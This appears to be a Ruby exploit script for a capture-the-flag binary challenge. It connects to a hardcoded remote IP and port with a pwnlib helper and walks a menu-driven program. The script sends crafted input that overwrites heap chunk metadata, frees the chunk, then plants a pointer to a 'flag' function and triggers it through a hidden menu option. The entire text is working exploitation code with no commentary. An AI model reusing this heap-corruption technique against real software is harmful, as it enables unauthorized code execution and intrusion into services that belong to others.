#!/usr/bin/env ruby
require '~/Tools/pwnlib'

local = false#true
if local
	host, port = '127.0.0.1', 4444
else
	host, port = '104.196.15.126', 15050
end

def bring(index, type, name)
	@r.recv_until("Enter your choice:")	
	@r.send("#{index}\n")
	@r.send("#{type}\n")
	@r.send("#{name}\n")
	@r.recv_until("Menu Options:")
end

def delete(index)
	@r.recv_until("Enter your choice:")	
	@r.send("4\n")
	@r.recv_until("Which element do you want to delete?")
	@r.send("#{index}\n")
end

def secret()
	@r.recv_until("Enter your choice:")
	@r.send("4919\n")
	puts @r.recv(65535)
	puts @r.recv(65535)
	puts @r.recv(65535)
	puts @r.recv(65535)
	puts @r.recv(65535)
end

def p64(*addr)
	return addr.pack("Q*")
end
def p32(*addr)
	return addr.pack("L*")
end
PwnTube.open(host, port) do |r|
	@r=r
	flag = 0x4008dd
	bring(1, 1, "aaaa")
	bring(1, 1, "bbbb")
	bring(3, 1, "aaaabbbbcccc#{p32(3)+p64(0x0000000200000000,0x0000000000020fc1)}")
	delete(1)
	bring(1, 1, "a"*16+p64(0x100000000, 0x21, flag))
	#delete(1)
	secret()
end
